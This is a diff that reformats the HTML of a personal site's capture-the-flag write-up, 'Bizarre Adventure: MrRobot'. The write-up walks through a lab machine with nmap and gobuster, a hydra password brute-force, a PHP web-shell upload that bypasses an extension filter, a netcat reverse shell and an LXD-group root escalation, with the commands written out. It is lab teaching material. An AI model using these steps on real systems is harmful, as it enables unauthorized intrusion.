@@ -5,203 +5,205 @@
 	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
 -->
 <html>
-	<head>
-		<title>Anant</title>
-		<meta charset="utf-8" />
-		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-		<link rel="stylesheet" href="assets/css/main.css" />
-		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
-	</head>
-	<body class="is-preload">
 
-		<!-- Wrapper -->
-			<div id="wrapper">
+<head>
+  <title>Anant</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+  <link rel="stylesheet" href="assets/css/main.css" />
+  <noscript>
+    <link rel="stylesheet" href="assets/css/noscript.css" />
+  </noscript>
+</head>
 
-				<!-- Header -->
-					<header id="header">
-						  <div class="container">
-    <p>$ <span class="typed-text"></span><span class="cursor">&nbsp;</span></p>
-  </div>
-						<h1 class="ml11">
-  <span class="text-wrapper">
-   <span class="logo__cursor" style="
+<body class="is-preload">
+
+  <!-- Wrapper -->
+  <div id="wrapper">
+
+    <!-- Header -->
+    <header id="header">
+      <div class="container">
+        <p>$ <span class="typed-text"></span><span class="cursor">&nbsp;</span></p>
+      </div>
+      <h1 class="ml11">
+        <span class="text-wrapper">
+          <span class="logo__cursor" style="
                    
                  ">
-</span>
-</h1>
-						<nav>
-							<a href="#menu"></a>
-						</nav>
-					</header>
+          </span>
+      </h1>
+      <nav>
+        <a href="#menu"></a>
+      </nav>
+    </header>
 
-				<!-- Menu -->
-					<nav id="menu">
-						<ul class="links">
-							<li><a href="index.html">About</a></li>
-							<li><a href="landing.html">Write-ups</a></li>
-							<li><a href="scripts.html">Pyhton-scripts</a></li>
-							<li><a href="Article.html">Articles</a></li>
-
-							
-						</ul>
-						
-					</nav>
-
-				<!-- Main -->
-					<div id="main" class="alt">
-
-						<!-- One -->
-							<section id="one">
-								<div class="inner">
-									<header class="major">
-										<h1>Bizarre Adventure: MrRobot</h1>
-									</header>
-									<span class="image main"><img src="#" alt="" /></span>
-									
-                                    Lets start with nmap.
-                                    <h4> > nmap -sC -sV 10.0.2.64 </h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/nmap.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    port 22 , 53, and 80 open..let’s open port 80 (on browser) and start gobuster for finding hidden directories..
-                                    <h4></h4>
-                                    <h4> > gobuster dir -u http://10.0.2.64 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt .php .js</h4>
-
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/gobuster.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-                                    i checked /administrator directory, i found a login page …but for that we have to find username and pass.
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/web.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-
-                                    now, i checked /images directory and found 2 intresting thing flag.txt.txt and hidden .png
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/web1.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    i opened flag.txt.txt first, didn’t find any flag but get a hint to open hidden.png...
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/flag.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/web3.png" alt="Norway" style="width:120%">
-                                    </div>
-                                    <h4></h4>
-                                    So, i downloaded this png file and trying to extract file or directory from it, if there is any..                                    <h4></h4>
-                                    <h4> > binwalk -e hidden.png</h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/bin.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-                                   
-                                    Great we extract a directory from hidden.png…..this extracted directory contain a file name 29.zlib ….now i use stegnography tool….for read this file..
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/stego.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-                                    We got next hint …. username is Mrrobot and now we will do bruteforce by hydra ;)
-                                    <h4></h4>
-                                    <h4> > hydra -l mrrobot -P /usr/share/wordlists/rockyou.txt 10.0.2.64 http-post-form “/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed”</h4>
-
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/hydra.png" alt="Norway" style="width:130%">
-                                    </div>
-                                    <h4></h4>
-                                    password is “secret”… after login i got option for uploading files…
-                                    <h4></h4>
-                                      <div class="polaroid">
-                                    <img src="images/bizarre2/upload.png" alt="Norway" style="width:130%">
-                                    </div>
-                                      <h4></h4>
-                                    i tried to upload .php file but it shows ..only .jpg .png .gif extensions are allowed….for bypass this ….i write my malicious code and save in shell.jpg.php file.
-                                    <h4></h4>
-                                    
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/shell.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-                                    upload this file …and in other tab type.
-                                    <h4></h4>
-                                    <h4> > 10.0.2.64/administrator/shell.php</h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/shell1.png" alt="Norway" style="width:140%">
-                                    </div>
-                                    <h4></h4>
-                                    Now start your netcat for listening….You should get your www-data shell.
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/nc.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    for proper shell write python command..
-                                    <h4></h4>
-                                    <h4>  > python3 -c 'import pty;typ.spawn("/bin/bash")'</h4>
-                                    Now, i checked user in /home directory ….. i also checked /var/www directory there i found a directory name “bf” and in that directory a file buffer…i did strings to this file and i got password for our user.
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/bf.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/user.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    Great now we are in exploiter account …. i ran command for checking SUID files…..and check groups ….. I found that user exploiter is in lxd group.
-                                    <h4> > find / -perm -u=s -type f 2>/dev/null</h4>
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/SUID.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    First we have to build alpine in our local system and then transfer to victim’s machine in /tmp directory by wget….i have already alpine-v3.12-x86*******.tar.gz file…..so i just transfer it to victim’s machine…
-                                    <h4></h4>
-                                    <div class="polaroid">
-                                    <img src="images/bizarre2/wget.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h4></h4>
-                                    Now just follow my steps….
-                                         write full name of file….in place of these stars…
+    <!-- Menu -->
+    <nav id="menu">
+      <ul class="links">
+        <li><a href="index.html">About</a></li>
+        <li><a href="landing.html">Write-ups</a></li>
+        <li><a href="scripts.html">Pyhton-scripts</a></li>
+        <li><a href="Article.html">Articles</a></li>
 
 
+      </ul>
 
-                                         <h4></h4>
-                                    <h4> > lxc image import ./alpine-v3********.tar.gz — alias infinity</h4>
-                                        <h4> > lxc init infinity ignite -c security.privilaged=true</h4>
-                                        <h4> > lxc config device add ignite infinity disk source=/ path=/mnt/root recursive=true</h4>
-                                        <h4> > lxc start ignite</h4>
-                                        <h4> > lxc exec ignite /bin/sh</h4>
-                                        <h4></h4>
-                                        <div class="polaroid">
-                                    <img src="images/bizarre2/lxd.png" alt="Norway" style="width:100%">
-                                    </div>
-                                        
-                                        <h4></h4>
-                                        BOOM! we got root shell :)
-                                        Now change directory to /mnt/root/root and read flag.txt.txt
-                                        <h4></h4>
-                                        <div class="polaroid">
-                                    <img src="images/proof.png" alt="Norway" style="width:100%">
-                                    </div>
-                                    <h2></h2>
-                                    <h2>!! Happy Hacking !!</h2>
+    </nav>
+
+    <!-- Main -->
+    <div id="main" class="alt">
+
+      <!-- One -->
+      <section id="one">
+        <div class="inner">
+          <header class="major">
+            <h1>Bizarre Adventure: MrRobot</h1>
+          </header>
+          <span class="image main"><img src="#" alt="" /></span>
+
+          Lets start with nmap.
+          <h4> > nmap -sC -sV 10.0.2.64 </h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/nmap.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          port 22 , 53, and 80 open..let’s open port 80 (on browser) and start gobuster for finding hidden directories..
+          <h4></h4>
+          <h4> > gobuster dir -u http://10.0.2.64 -w
+            /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt .php .js</h4>
+
+          <div class="polaroid">
+            <img src="images/bizarre2/gobuster.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+          i checked /administrator directory, i found a login page …but for that we have to find username and pass.
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/web.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+
+          now, i checked /images directory and found 2 intresting thing flag.txt.txt and hidden .png
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/web1.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          i opened flag.txt.txt first, didn’t find any flag but get a hint to open hidden.png...
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/flag.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/web3.png" alt="Norway" style="width:120%">
+          </div>
+          <h4></h4>
+          So, i downloaded this png file and trying to extract file or directory from it, if there is any.. <h4></h4>
+          <h4> > binwalk -e hidden.png</h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/bin.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+
+          Great we extract a directory from hidden.png…..this extracted directory contain a file name 29.zlib ….now i
+          use stegnography tool….for read this file..
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/stego.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+          We got next hint …. username is Mrrobot and now we will do bruteforce by hydra ;)
+          <h4></h4>
+          <h4> > hydra -l mrrobot -P /usr/share/wordlists/rockyou.txt 10.0.2.64 http-post-form
+            “/administrator/index.php:username=mrrobot&pass=^PASS^:Login Failed”</h4>
+
+          <div class="polaroid">
+            <img src="images/bizarre2/hydra.png" alt="Norway" style="width:130%">
+          </div>
+          <h4></h4>
+          password is “secret”… after login i got option for uploading files…
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/upload.png" alt="Norway" style="width:130%">
+          </div>
+          <h4></h4>
+          i tried to upload .php file but it shows ..only .jpg .png .gif extensions are allowed….for bypass this ….i
+          write my malicious code and save in shell.jpg.php file.
+          <h4></h4>
+
+          <div class="polaroid">
+            <img src="images/bizarre2/shell.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+          upload this file …and in other tab type.
+          <h4></h4>
+          <h4> > 10.0.2.64/administrator/shell.php</h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/shell1.png" alt="Norway" style="width:140%">
+          </div>
+          <h4></h4>
+          Now start your netcat for listening….You should get your www-data shell.
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/nc.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          for proper shell write python command..
+          <h4></h4>
+          <h4> > python3 -c 'import pty;typ.spawn("/bin/bash")'</h4>
+          Now, i checked user in /home directory ….. i also checked /var/www directory there i found a directory name
+          “bf” and in that directory a file buffer…i did strings to this file and i got password for our user.
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/bf.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/user.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          Great now we are in exploiter account …. i ran command for checking SUID files…..and check groups ….. I found
+          that user exploiter is in lxd group.
+          <h4> > find / -perm -u=s -type f 2>/dev/null</h4>
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/SUID.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          First we have to build alpine in our local system and then transfer to victim’s machine in /tmp directory by
+          wget….i have already alpine-v3.12-x86*******.tar.gz file…..so i just transfer it to victim’s machine…
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/wget.png" alt="Norway" style="width:100%">
+          </div>
+          <h4></h4>
+          Now just follow my steps….
+          write full name of file….in place of these stars…
 
 
 
+          <h4></h4>
+          <h4> > lxc image import ./alpine-v3********.tar.gz — alias infinity</h4>
+          <h4> > lxc init infinity ignite -c security.privilaged=true</h4>
+          <h4> > lxc config device add ignite infinity disk source=/ path=/mnt/root recursive=true</h4>
+          <h4> > lxc start ignite</h4>
+          <h4> > lxc exec ignite /bin/sh</h4>
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/bizarre2/lxd.png" alt="Norway" style="width:100%">
+          </div>
 
-
-                                                    
-
-
-
+          <h4></h4>
+          BOOM! we got root shell :)
+          Now change directory to /mnt/root/root and read flag.txt.txt
+          <h4></h4>
+          <div class="polaroid">
+            <img src="images/proof.png" alt="Norway" style="width:100%">
+          </div>
+          <h2></h2>
+          <h2>!! Happy Hacking !!</h2>
 
 
 
@@ -219,42 +221,57 @@
 
 
 
-								</div>
-							</section>
 
-					</div>
 
-				
 
-				<!-- Footer -->
-					<footer id="footer">
-						<div class="inner">
-							<header class="major">
-										<h2>Connect with me</h2>
-									</header>
-							<ul class="icons">
-								<li><a href="https://twitter.com/_Anant_chauhan" class="icon brands alt fa-twitter"><span class="label">Twitter</span></a></li>
-								<li><a href="https://www.linkedin.com/in/anant-chauhan-a07b2419b" class="icon brands alt fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
-								<li><a href="https://medium.com/@Infinity_" class="icon brands alt fa-medium"><span class="label">Medium</span></a></li>
-								<li><a href="https://discord.com/channels/@infinity_#9175" class="icon brands alt fa-discord"><span class="label">Discord</span></a></li>
-								<li><a href="https://www.twitch.tv/anant_infinity" class="icon brands alt fa-twitch"><span class="label">Twitch</span></a></li>
-							</ul>
-							<ul class="copyright">
-								<li>&copy; 2020</li><li>Anant</li>
-							</ul>
-						</div>
-					</footer>
 
-			</div>
 
-		<!-- Scripts -->
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.scrolly.min.js"></script>
-			<script src="assets/js/jquery.scrollex.min.js"></script>
-			<script src="assets/js/browser.min.js"></script>
-			<script src="assets/js/breakpoints.min.js"></script>
-			<script src="assets/js/util.js"></script>
-			<script src="assets/js/main.js"></script>
 
-	</body>
+
+
+
+        </div>
+      </section>
+
+    </div>
+
+
+
+    <!-- Footer -->
+    <footer id="footer">
+      <div class="inner">
+        <header class="major">
+          <h2>Connect with me</h2>
+        </header>
+        <ul class="icons">
+          <li><a href="https://twitter.com/_Anant_chauhan" class="icon brands alt fa-twitter"><span
+                class="label">Twitter</span></a></li>
+          <li><a href="https://www.linkedin.com/in/anant-chauhan-a07b2419b" class="icon brands alt fa-linkedin-in"><span
+                class="label">LinkedIn</span></a></li>
+          <li><a href="https://medium.com/@Infinity_" class="icon brands alt fa-medium"><span
+                class="label">Medium</span></a></li>
+          <li><a href="https://discord.com/channels/@infinity_#9175" class="icon brands alt fa-discord"><span
+                class="label">Discord</span></a></li>
+          <li><a href="https://www.twitch.tv/anant_infinity" class="icon brands alt fa-twitch"><span
+                class="label">Twitch</span></a></li>
+        </ul>
+        <ul class="copyright">
+          <li>&copy; 2024 | Anant Chauhan</li>
+        </ul>
+      </div>
+    </footer>
+
+  </div>
+
+  <!-- Scripts -->
+  <script src="assets/js/jquery.min.js"></script>
+  <script src="assets/js/jquery.scrolly.min.js"></script>
+  <script src="assets/js/jquery.scrollex.min.js"></script>
+  <script src="assets/js/browser.min.js"></script>
+  <script src="assets/js/breakpoints.min.js"></script>
+  <script src="assets/js/util.js"></script>
+  <script src="assets/js/main.js"></script>
+
+</body>
+
 </html>
